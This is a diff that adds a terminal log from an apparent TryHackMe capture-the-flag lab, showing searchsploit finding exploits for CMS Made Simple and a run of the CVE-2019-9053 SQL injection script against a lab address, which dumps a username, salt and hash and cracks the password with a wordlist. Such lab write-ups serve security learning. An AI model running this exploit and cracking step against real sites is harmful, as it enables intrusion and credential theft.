@@ -1,0 +1,34 @@
+└─$ searchsploit cms made simple 2.2 
+------------------------------- ---------------------------------
+ Exploit Title                 |  Path
+------------------------------- ---------------------------------
+CMS Made Simple 1.2.2 Module T | php/webapps/4810.txt
+CMS Made Simple 1.2.4 Module F | php/webapps/5600.php
+CMS Made Simple 2.2.14 - Arbit | php/webapps/48779.py
+CMS Made Simple 2.2.14 - Authe | php/webapps/48742.txt
+CMS Made Simple 2.2.14 - Persi | php/webapps/48851.txt
+CMS Made Simple 2.2.15 - 'titl | php/webapps/49793.txt
+CMS Made Simple 2.2.15 - RCE ( | php/webapps/49345.txt
+CMS Made Simple 2.2.15 - Store | php/webapps/49199.txt
+CMS Made Simple 2.2.5 - (Authe | php/webapps/44976.py
+CMS Made Simple 2.2.7 - (Authe | php/webapps/45793.py
+CMS Made Simple < 2.2.10 - SQL | php/webapps/46635.py
+------------------------------- ---------------------------------
+Shellcodes: No Results
+
+└─$ searchsploit -m php/webapps/46635.py
+
+  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
+      URL: https://www.exploit-db.com/exploits/46635
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+    Codes: CVE-2019-9053
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/Documents/CTF Projects/try_hack_me/try_hack_me/challenges/simple_CTF/46635.py
+
+└─$ python 46635.py -u http://10.10.6.153/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
